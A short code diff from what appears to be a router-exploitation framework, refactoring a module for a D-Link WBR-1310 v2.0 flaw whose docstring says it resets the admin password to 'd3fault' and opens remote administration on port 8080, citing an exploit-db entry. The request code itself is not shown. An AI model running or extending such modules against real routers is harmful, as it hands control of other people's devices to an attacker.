@@ -2,15 +2,15 @@ import urllib
 import util
 from ..router_vuln import RouterVuln
 
-__router__='WBR-1310 v2.0'
-__vuln__='Change Admin Password'
-class ChangeAdmin(RouterVuln):
+class change_admin_1310(RouterVuln):
 	"""Changes the admin psasword to d3fault and enables remote administration
 	   on port 8080.
 	   http://www.exploit-db.com/exploits/15810/
 	"""
 	def __init__(self):
-		super(ChangeAdmin,self).__init__()
+		self.router = 'WBR-1310 v2.0'
+		self.vuln   = 'Change Admin Password'
+		super(change_admin_1310,self).__init__()
 
 	def run(self):
 		util.Msg('Changing admin password to \'d3fault\' and enabling remote admin on port 8080...')
